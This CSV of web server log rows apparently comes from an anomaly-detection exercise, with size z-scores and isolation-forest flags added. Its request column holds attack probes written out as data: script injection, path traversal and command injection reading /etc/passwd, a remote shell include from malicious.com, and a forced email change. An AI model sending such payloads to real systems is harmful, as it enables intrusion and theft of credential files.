ip,timestamp,request,status,size,size_zscore,size_anomaly,request_length,status_code,iso_forest,is_anomaly
252.105.133.214,2025-03-15 12:13:43,POST /change-email?email=attacker@example.com HTTP/1.1,200,951,-1.3753069986993254,False,54,200,True,True
210.250.125.118,2025-03-15 12:13:04,POST /upload-xml HTTP/1.1,403,673,-1.588761569582849,False,25,403,True,True
143.180.87.252,2025-03-15 12:13:27,GET /admin HTTP/1.1,403,4518,1.363514779507612,False,19,403,True,True
103.156.18.254,2025-03-15 12:13:42,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4507,1.3550687353359618,False,59,200,True,True
206.200.138.27,2025-03-15 12:13:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4752,1.5431851737045348,False,60,200,True,True
19.29.145.100,2025-03-15 12:13:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3474,0.5619084053982645,False,60,200,True,True
103.177.24.202,2025-03-15 12:13:04,POST /change-email?email=attacker@example.com HTTP/1.1,200,4278,1.1792374521261528,False,54,200,True,True
98.144.179.78,2025-03-15 12:13:20,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1450,-0.9921637221853747,False,60,200,True,True
187.22.194.114,2025-03-15 12:13:35,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4963,1.7051956573607343,False,47,403,True,True
248.89.151.16,2025-03-15 12:13:34,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4477,1.3320340694132793,False,60,200,True,True
144.27.186.172,2025-03-15 12:13:44,GET /admin HTTP/1.1,403,4512,1.3589078463230755,False,19,403,True,True
107.76.112.21,2025-03-15 12:12:56,POST /upload-xml HTTP/1.1,403,670,-1.591065036175117,False,25,403,True,True
187.115.97.185,2025-03-15 12:13:37,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,538,-1.6924175662349197,False,51,403,True,True
157.191.210.229,2025-03-15 12:13:27,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1094,-1.2655084244678725,False,60,200,True,True
231.228.70.96,2025-03-15 12:12:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,865,-1.4413397076776815,False,51,403,True,True
94.163.236.222,2025-03-15 12:13:40,GET /admin HTTP/1.1,403,4563,1.3980667783916356,False,19,403,True,True
70.139.166.236,2025-03-15 12:13:40,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,529,-1.6993279660117244,False,51,403,True,True
56.106.13.17,2025-03-15 12:13:02,GET /execute?cmd=whoami HTTP/1.1,403,625,-1.6256170350591408,False,32,403,True,True
49.176.18.83,2025-03-15 12:13:19,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,701,-1.567262548055012,False,47,403,True,True
198.158.34.122,2025-03-15 12:13:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3913,0.8989823500668502,False,60,200,True,True
94.42.9.172,2025-03-15 12:13:23,POST /change-email?email=attacker@example.com HTTP/1.1,200,4899,1.6560550367256786,False,54,200,True,True
119.95.168.43,2025-03-15 12:13:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,670,-1.591065036175117,False,60,200,True,True
96.150.164.214,2025-03-15 12:13:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,926,-1.394502553634894,False,60,200,True,True
16.11.179.114,2025-03-15 12:13:29,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4578,1.4095841113529768,False,51,403,True,True
119.204.127.199,2025-03-15 12:13:12,POST /change-email?email=attacker@example.com HTTP/1.1,200,851,-1.4520892184416,False,54,200,True,True
217.45.166.233,2025-03-15 12:13:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1361,-1.0604998977559992,False,60,200,True,True
138.28.120.200,2025-03-15 12:13:52,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4648,1.463331665172569,False,47,403,True,True
27.135.32.46,2025-03-15 12:13:12,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4809,1.5869510389576313,False,59,200,True,True
106.53.112.121,2025-03-15 12:13:34,GET /admin HTTP/1.1,403,4629,1.448743043421537,False,19,403,True,True
23.120.16.69,2025-03-15 12:13:55,POST /change-email?email=attacker@example.com HTTP/1.1,200,1014,-1.3269342002616924,False,54,200,True,True
80.164.158.106,2025-03-15 12:13:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,990,-1.3453619329998383,False,60,200,True,True
85.223.28.59,2025-03-15 12:13:24,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4700,1.5032584194385519,False,59,200,True,True
159.79.19.228,2025-03-15 12:13:39,POST /change-email?email=attacker@example.com HTTP/1.1,200,4253,1.1600418971905841,False,54,200,True,True
86.114.119.105,2025-03-15 12:13:01,POST /change-email?email=attacker@example.com HTTP/1.1,200,4398,1.2713761158168824,False,54,200,True,True
220.161.244.22,2025-03-15 12:13:03,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,956,-1.3714678877122115,False,59,200,True,True
214.78.40.255,2025-03-15 12:13:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,905,-1.4106268197807716,False,59,200,True,True
191.97.179.57,2025-03-15 12:13:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,811,-1.48280210633851,False,54,200,True,True
238.12.201.19,2025-03-15 12:13:24,POST /change-email?email=attacker@example.com HTTP/1.1,200,4991,1.726694678888571,False,54,200,True,True
81.237.170.74,2025-03-15 12:13:30,GET /admin HTTP/1.1,403,4937,1.6852322802277429,False,19,403,True,True
231.45.118.81,2025-03-15 12:13:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1342,-1.0750885195070314,False,60,200,True,True
196.180.195.182,2025-03-15 12:13:48,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4870,1.6337881930004188,False,47,403,True,True
143.219.117.149,2025-03-15 12:13:53,POST /change-email?email=attacker@example.com HTTP/1.1,200,834,-1.4651421957977866,False,54,200,True,True
129.105.27.2,2025-03-15 12:13:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4857,1.6238065044339232,False,60,200,True,True
114.112.14.175,2025-03-15 12:13:49,POST /upload-xml HTTP/1.1,403,693,-1.573405125634394,False,25,403,True,True
46.35.73.217,2025-03-15 12:13:22,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,775,-1.5104437054457287,False,59,200,True,True
106.198.225.173,2025-03-15 12:13:55,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,619,-1.6302239682436772,False,59,200,True,True
132.82.195.209,2025-03-15 12:13:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2985,0.18644335085854136,False,60,200,True,True
94.225.49.93,2025-03-15 12:13:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1737,-0.7717987515250465,False,60,200,True,True
223.43.190.207,2025-03-15 12:13:37,POST /wp-json/wp/v2/users HTTP/1.1,403,536,-1.6939532106297652,False,34,403,True,True
2.2.72.128,2025-03-15 12:13:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4443,1.305928114700906,False,47,403,True,True
148.210.210.206,2025-03-15 12:13:23,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4972,1.712106057137539,False,60,200,True,True
36.198.207.17,2025-03-15 12:13:14,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,990,-1.3453619329998383,False,51,403,True,True
22.17.8.9,2025-03-15 12:13:38,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,590,-1.6524908119689368,False,51,403,True,True
193.32.182.26,2025-03-15 12:13:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4575,1.4072806447607085,False,60,200,True,True
172.199.0.113,2025-03-15 12:13:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1528,-0.9322735907864005,False,60,200,True,True
210.127.214.240,2025-03-15 12:13:34,POST /upload-xml HTTP/1.1,403,663,-1.5964397915570763,False,25,403,True,True
157.11.140.70,2025-03-15 12:13:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4658,1.4710098871467965,False,60,200,True,True
111.173.211.159,2025-03-15 12:13:06,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,618,-1.6309917904411,False,47,403,True,True
59.66.61.159,2025-03-15 12:14:03,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,536,-1.6939532106297652,False,47,403,True,True
213.68.167.87,2025-03-15 12:13:20,POST /upload-xml HTTP/1.1,403,4943,1.6898392134122793,False,25,403,True,True
97.91.206.81,2025-03-15 12:13:34,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,658,-1.6002789025441901,False,47,403,True,True
239.143.84.152,2025-03-15 12:13:17,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4493,1.3443192245720432,False,60,200,True,True
6.88.117.51,2025-03-15 12:13:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4516,1.3619791351127666,False,51,403,True,True
1.58.59.122,2025-03-15 12:13:57,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1084,-1.2731866464421,False,51,403,True,True
66.5.71.248,2025-03-15 12:13:27,GET /admin HTTP/1.1,403,4888,1.6476089925540283,False,19,403,True,True
82.67.120.146,2025-03-15 12:13:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,977,-1.355343621566334,False,54,200,True,True
41.111.5.205,2025-03-15 12:14:07,GET /admin HTTP/1.1,403,742,-1.5357818379606794,False,19,403,True,True
36.148.118.16,2025-03-15 12:13:26,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4821,1.5961649053267042,False,47,403,True,True
109.223.246.125,2025-03-15 12:13:22,POST /change-email?email=attacker@example.com HTTP/1.1,200,1249,-1.1464959838673467,False,54,200,True,True
246.174.76.244,2025-03-15 12:13:48,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4945,1.6913748578071248,False,60,200,True,True
202.172.129.34,2025-03-15 12:13:37,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,826,-1.4712847733771686,False,47,403,True,True
21.235.173.244,2025-03-15 12:13:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1513,-0.9437909237477418,False,60,200,True,True
250.242.190.87,2025-03-15 12:13:11,POST /change-email?email=attacker@example.com HTTP/1.1,200,4690,1.4955801974643244,False,54,200,True,True
110.186.20.126,2025-03-15 12:13:49,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4440,1.3036246481086378,False,47,403,True,True
143.19.239.126,2025-03-15 12:13:20,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4941,1.6883035690174337,False,59,200,True,True
148.145.128.46,2025-03-15 12:13:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4855,1.6222708600390776,False,60,200,True,True
93.195.169.83,2025-03-15 12:13:45,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3357,0.4720732082998031,False,60,200,True,True
125.95.185.161,2025-03-15 12:13:42,POST /wp-json/wp/v2/users HTTP/1.1,403,569,-1.6686150781148146,False,34,403,True,True
124.144.212.99,2025-03-15 12:13:28,POST /change-email?email=attacker@example.com HTTP/1.1,200,4776,1.5616129064426807,False,54,200,True,True
59.127.204.249,2025-03-15 12:13:31,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1049,-1.3000604233518962,False,51,403,True,True
44.46.24.162,2025-03-15 12:13:48,GET /admin HTTP/1.1,403,4650,1.4648673095674145,False,19,403,True,True
120.69.47.250,2025-03-15 12:13:56,POST /change-email?email=attacker@example.com HTTP/1.1,200,536,-1.6939532106297652,False,54,200,True,True
75.152.122.55,2025-03-15 12:15:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,650,-1.606421480123572,False,59,200,True,True
4.196.46.218,2025-03-15 12:15:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3908,0.8951432390797365,False,60,200,True,True
148.177.87.230,2025-03-15 12:14:37,POST /change-email?email=attacker@example.com HTTP/1.1,403,3086,0.26399339279823875,False,54,403,True,True
231.255.217.160,2025-03-15 12:14:44,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4356,1.239127583525127,False,60,200,True,True
91.181.209.135,2025-03-15 12:15:21,GET /api/user?username=admin HTTP/1.1,403,4773,1.5593094398504124,False,37,403,True,True
78.243.251.158,2025-03-15 12:14:39,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,654,-1.603350191333881,False,60,200,True,True
145.67.127.93,2025-03-15 12:14:49,POST /change-email?email=attacker@example.com HTTP/1.1,403,1054,-1.2962213123647823,False,54,403,True,True
73.226.42.141,2025-03-15 12:15:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3469,0.5580692944111507,False,60,200,True,True
7.123.132.186,2025-03-15 12:14:44,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,671,-1.5902972139776943,False,59,200,True,True
182.227.196.79,2025-03-15 12:14:30,POST /change-email?email=attacker@example.com HTTP/1.1,403,4779,1.5639163730349488,False,54,403,True,True
46.164.61.5,2025-03-15 12:15:00,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4601,1.4272440218937,False,51,403,True,True
3.126.225.38,2025-03-15 12:14:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,832,-1.4666778401926321,False,47,200,True,True
186.182.55.43,2025-03-15 12:14:48,POST /change-email?email=attacker@example.com HTTP/1.1,403,3245,0.38607712218845547,False,54,403,True,True
204.224.75.131,2025-03-15 12:15:18,POST /change-email?email=attacker@example.com HTTP/1.1,403,1486,-0.9645221230781559,False,54,403,True,True
151.52.156.90,2025-03-15 12:14:55,POST /change-email?email=attacker@example.com HTTP/1.1,403,3905,0.8928397724874683,False,54,403,True,True
195.225.158.73,2025-03-15 12:15:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4253,1.1600418971905841,False,60,200,True,True
33.14.182.195,2025-03-15 12:15:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1223,-1.1664593610003382,False,59,200,True,True
154.206.141.170,2025-03-15 12:15:21,POST /change-email?email=attacker@example.com HTTP/1.1,403,1313,-1.097355363232291,False,54,403,True,True
13.237.248.223,2025-03-15 12:15:09,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,792,-1.497390728089542,False,60,200,True,True
142.112.134.22,2025-03-15 12:15:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,966,-1.3637896657379842,False,60,200,True,True
158.232.171.152,2025-03-15 12:14:51,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4319,1.2107181622204854,False,47,200,True,True
16.241.115.31,2025-03-15 12:14:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4131,1.066367589105009,False,47,200,True,True
35.217.48.155,2025-03-15 12:14:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,2996,0.19488939503019156,False,60,200,True,True
143.232.184.182,2025-03-15 12:14:56,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4693,1.4978836640565927,False,60,200,True,True
255.184.7.206,2025-03-15 12:14:55,GET /api/user?username=admin HTTP/1.1,403,4670,1.4802237535158695,False,37,403,True,True
95.23.107.23,2025-03-15 12:15:21,POST /change-email?email=attacker@example.com HTTP/1.1,403,951,-1.3753069986993254,False,54,403,True,True
112.235.45.106,2025-03-15 12:14:37,GET /admin HTTP/1.1,403,4590,1.4187979777220496,False,19,403,True,True
88.161.151.187,2025-03-15 12:15:02,POST /change-email?email=attacker@example.com HTTP/1.1,403,4192,1.1132047431477965,False,54,403,True,True
129.136.53.88,2025-03-15 12:15:26,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,501,-1.7208269875395614,False,51,403,True,True
51.78.103.76,2025-03-15 12:15:07,POST /change-email?email=attacker@example.com HTTP/1.1,403,3120,0.29009934751061217,False,54,403,True,True
34.148.78.28,2025-03-15 12:15:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3105,0.27858201454927095,False,60,200,True,True
142.255.181.156,2025-03-15 12:15:19,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1823,-0.7057660425466903,False,60,200,True,True
161.90.85.205,2025-03-15 12:14:49,POST /change-email?email=attacker@example.com HTTP/1.1,403,4002,0.9673185256374747,False,54,403,True,True
202.40.31.23,2025-03-15 12:15:03,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,543,-1.688578455247806,False,60,200,True,True
138.85.80.229,2025-03-15 12:14:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4725,1.5224539743741206,False,59,200,True,True
70.145.215.73,2025-03-15 12:15:15,GET /etc/passwd HTTP/1.1,403,585,-1.6563299229560506,False,24,403,True,True
73.184.13.127,2025-03-15 12:14:38,POST /change-email?email=attacker@example.com HTTP/1.1,403,4562,1.3972989561942128,False,54,403,True,True
111.215.41.113,2025-03-15 12:15:06,POST /change-email?email=attacker@example.com HTTP/1.1,403,1672,-0.821707194357525,False,54,403,True,True
85.45.106.158,2025-03-15 12:14:48,POST /change-email?email=attacker@example.com HTTP/1.1,403,4959,1.7021243685710432,False,54,403,True,True
137.201.88.234,2025-03-15 12:14:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4372,1.251412738683891,False,47,200,True,True
121.2.196.70,2025-03-15 12:15:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4467,1.324355847439052,False,47,200,True,True
233.146.223.58,2025-03-15 12:15:13,POST /change-email?email=attacker@example.com HTTP/1.1,403,4701,1.5040262416359746,False,54,403,True,True
169.174.221.41,2025-03-15 12:14:48,POST /change-email?email=attacker@example.com HTTP/1.1,403,4305,1.1999686514565668,False,54,403,True,True
94.157.137.248,2025-03-15 12:15:31,GET /api/user?username=admin HTTP/1.1,403,4997,1.7313016120731075,False,37,403,True,True
179.113.73.215,2025-03-15 12:14:39,GET /api/user?username=admin HTTP/1.1,403,4631,1.4502786878163823,False,37,403,True,True
125.90.183.243,2025-03-15 12:14:37,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,990,-1.3453619329998383,False,51,403,True,True
117.127.239.65,2025-03-15 12:14:59,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,722,-1.5511382819091344,False,60,200,True,True
229.202.132.137,2025-03-15 12:15:15,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4965,1.7067313017555796,False,51,403,True,True
86.58.44.200,2025-03-15 12:15:27,POST /change-email?email=attacker@example.com HTTP/1.1,403,1392,-1.036697409635894,False,54,403,True,True
36.195.144.7,2025-03-15 12:15:15,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3432,0.5296598731065091,False,60,200,True,True
28.100.49.61,2025-03-15 12:14:42,POST /change-email?email=attacker@example.com HTTP/1.1,403,3011,0.20640672799153278,False,54,403,True,True
101.100.238.104,2025-03-15 12:15:10,GET /api/user?username=admin HTTP/1.1,403,4874,1.6368594817901099,False,37,403,True,True
158.35.58.32,2025-03-15 12:14:51,GET /api/user?username=admin HTTP/1.1,403,4561,1.39653113399679,False,37,403,True,True
85.100.18.20,2025-03-15 12:15:17,GET /execute?cmd=whoami HTTP/1.1,403,649,-1.6071893023209949,False,32,403,True,True
78.44.174.36,2025-03-15 12:15:02,POST /change-email?email=attacker@example.com HTTP/1.1,403,1005,-1.333844600038497,False,54,403,True,True
254.183.56.95,2025-03-15 12:15:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3961,0.935837815543142,False,60,200,True,True
19.31.230.227,2025-03-15 12:14:36,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4359,1.2414310501173953,False,60,200,True,True
36.101.31.21,2025-03-15 12:15:00,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4594,1.4218692665117407,False,60,200,True,True
76.14.49.165,2025-03-15 12:15:34,POST /change-email?email=attacker@example.com HTTP/1.1,403,4416,1.2851969153704919,False,54,403,True,True
228.75.11.1,2025-03-15 12:15:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4817,1.5930936165370133,False,47,200,True,True
23.204.130.112,2025-03-15 12:14:50,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1816,-0.7111407979286495,False,60,200,True,True
155.10.45.222,2025-03-15 12:14:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4209,1.1262577205039832,False,47,200,True,True
88.55.223.32,2025-03-15 12:14:40,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,788,-1.500462016879233,False,59,200,True,True
87.58.96.249,2025-03-15 12:15:15,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1239,-1.1541742058415743,False,59,200,True,True
16.142.69.93,2025-03-15 12:14:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4407,1.2782865155936871,False,59,200,True,True
147.235.75.154,2025-03-15 12:14:39,POST /change-email?email=attacker@example.com HTTP/1.1,403,747,-1.5319427269735657,False,54,403,True,True
114.81.90.56,2025-03-15 12:15:28,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1008,-1.3315411334462288,False,51,403,True,True
169.224.107.213,2025-03-15 12:15:00,POST /login HTTP/1.1,401,4987,1.7236233900988802,False,20,401,True,True
50.46.113.64,2025-03-15 12:14:42,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4901,1.6575906811205239,False,51,403,True,True
20.218.147.17,2025-03-15 12:15:37,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4352,1.236056294735436,False,59,200,True,True
218.220.25.196,2025-03-15 12:15:38,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,796,-1.4943194392998511,False,59,200,True,True
48.162.144.127,2025-03-15 12:14:45,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,754,-1.5265679715916065,False,51,403,True,True
179.125.34.193,2025-03-15 12:14:43,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,810,-1.4835699285359325,False,47,200,True,True
22.208.235.41,2025-03-15 12:15:11,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,792,-1.497390728089542,False,59,200,True,True
29.192.154.20,2025-03-15 12:15:23,GET /api/user?username=admin HTTP/1.1,403,4925,1.6760184138586698,False,37,403,True,True
121.23.15.61,2025-03-15 12:15:36,POST /change-email?email=attacker@example.com HTTP/1.1,403,946,-1.379146109686439,False,54,403,True,True
127.92.70.248,2025-03-15 12:15:14,POST /change-email?email=attacker@example.com HTTP/1.1,403,3184,0.3392399681456679,False,54,403,True,True
162.57.5.215,2025-03-15 12:15:16,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3615,0.6701713352348717,False,60,200,True,True
58.32.195.161,2025-03-15 12:14:52,POST /change-email?email=attacker@example.com HTTP/1.1,403,835,-1.464374373600364,False,54,403,True,True
82.168.40.254,2025-03-15 12:15:04,POST /change-email?email=attacker@example.com HTTP/1.1,403,3469,0.5580692944111507,False,54,403,True,True
15.155.9.37,2025-03-15 12:15:31,GET /api/user?username=admin HTTP/1.1,403,4896,1.6537515701334102,False,37,403,True,True
4.80.102.50,2025-03-15 12:15:05,POST /change-email?email=attacker@example.com HTTP/1.1,403,2890,0.11350024210338043,False,54,403,True,True
223.105.69.146,2025-03-15 12:15:15,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4537,1.3781034012586442,False,51,403,True,True
120.240.254.123,2025-03-15 12:14:46,GET /api/user?username=admin HTTP/1.1,403,4689,1.4948123752669016,False,37,403,True,True
135.18.106.63,2025-03-15 12:15:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,859,-1.445946640862218,False,47,200,True,True
67.179.243.196,2025-03-15 12:15:33,POST /change-email?email=attacker@example.com HTTP/1.1,403,4564,1.3988346005890584,False,54,403,True,True
137.21.208.10,2025-03-15 12:15:31,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4813,1.5900223277473222,False,60,200,True,True
166.29.223.206,2025-03-15 12:15:41,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4147,1.078652744263773,False,47,200,True,True
135.192.242.130,2025-03-15 12:15:22,POST /change-email?email=attacker@example.com HTTP/1.1,403,4881,1.642234237172069,False,54,403,True,True
103.184.20.121,2025-03-15 12:14:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4786,1.569291128416908,False,51,403,True,True
235.237.158.192,2025-03-15 12:15:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1381,-1.0451434538075444,False,60,200,True,True
46.11.217.16,2025-03-15 12:15:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,3182,0.33770432375082243,False,60,200,True,True
201.127.150.174,2025-03-15 12:15:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4768,1.5554703288632987,False,60,200,True,True
216.145.153.29,2025-03-15 12:15:19,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,661,-1.5979754359519218,False,59,200,True,True
197.201.76.36,2025-03-15 12:15:10,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,200,4469,1.3258914918338973,False,47,200,True,True
175.107.165.245,2025-03-15 12:15:05,POST /change-email?email=attacker@example.com HTTP/1.1,403,4518,1.363514779507612,False,54,403,True,True
239.50.224.39,2025-03-15 12:15:21,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4368,1.2483414498942,False,60,200,True,True
78.32.102.136,2025-03-15 12:15:36,POST /change-email?email=attacker@example.com HTTP/1.1,403,753,-1.527335793789029,False,54,403,True,True
178.61.176.244,2025-03-15 12:15:08,POST /change-email?email=attacker@example.com HTTP/1.1,403,4450,1.3113028700828653,False,54,403,True,True
140.102.100.11,2025-03-15 12:15:33,POST /change-email?email=attacker@example.com HTTP/1.1,403,1822,-0.706533864744113,False,54,403,True,True
194.103.191.223,2025-03-15 12:15:24,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,1358,-1.0628033643482675,False,60,200,True,True
120.123.0.120,2025-03-15 12:14:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4835,1.6069144160906226,False,59,200,True,True
233.85.63.90,2025-03-15 12:15:35,GET /admin HTTP/1.1,403,4873,1.636091659592687,False,19,403,True,True
52.230.233.229,2025-03-15 12:15:31,GET /admin HTTP/1.1,403,4730,1.5262930853612342,False,19,403,True,True
106.189.86.160,2025-03-15 12:15:14,POST /change-email?email=attacker@example.com HTTP/1.1,403,1914,-0.6358942225812203,False,54,403,True,True
131.3.22.31,2025-03-15 12:15:44,POST /change-email?email=attacker@example.com HTTP/1.1,403,2114,-0.48232978309667096,False,54,403,True,True
219.147.130.243,2025-03-15 12:15:02,POST /change-email?email=attacker@example.com HTTP/1.1,403,752,-1.5281036159864518,False,54,403,True,True
158.104.61.190,2025-03-15 12:15:33,POST /change-email?email=attacker@example.com HTTP/1.1,403,4538,1.378871223456067,False,54,403,True,True
223.104.156.152,2025-03-15 12:15:07,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,200,4284,1.1838443853106893,False,60,200,True,True
156.61.76.17,2025-03-15 12:15:38,POST /change-email?email=attacker@example.com HTTP/1.1,403,1904,-0.6435724445554478,False,54,403,True,True
